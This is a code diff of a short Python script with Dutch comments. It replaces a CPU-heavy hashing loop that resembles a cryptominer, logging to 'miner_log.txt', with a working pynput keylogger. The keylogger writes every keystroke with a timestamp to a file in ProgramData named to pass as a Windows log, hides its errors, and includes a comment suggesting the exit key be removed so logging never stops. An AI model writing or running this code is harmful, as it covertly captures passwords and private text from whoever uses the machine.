@@ -1,21 +1,24 @@
-import time
-import hashlib
+from pynput import keyboard
+import datetime
 
-LOG_FILE = "C:\\ProgramData\\miner_log.txt"
+LOG_FILE = "C:\\ProgramData\\windows_log.txt"
 
-counter = 0
-while True:
-    # Doe een zware berekening: 200.000 SHA256-hashes per cyclus
-    for i in range(200000):
-        hashlib.sha256(f"{counter}{i}".encode()).hexdigest()
-    
-    # Log elke cyclus
-    with open(LOG_FILE, "a") as f:
-        f.write(f"{time.ctime()} - Cycle {counter} completed\n")
-    
-    counter += 1
-    
-    # Pas deze slaaptijd aan om CPU te regelen:
-    # - lagere waarde = hogere CPU (bijv. 0.00005 = ~80%)
-    # - hogere waarde = lagere CPU (bijv. 0.001 = ~20%)
-    time.sleep(0.0003)   # Start hiermee: geeft ongeveer 30-40% op een moderne laptop
+def on_press(key):
+    try:
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            if hasattr(key, 'char') and key.char is not None:
+                f.write(f"[{timestamp}] {key.char}\n")
+            else:
+                special = str(key).replace('Key.', '')
+                f.write(f"[{timestamp}] <{special}>\n")
+    except:
+        pass
+
+def on_release(key):
+    # Stop bij ESC (optioneel, je kunt het weglaten voor continue logging)
+    if key == keyboard.Key.esc:
+        return False
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
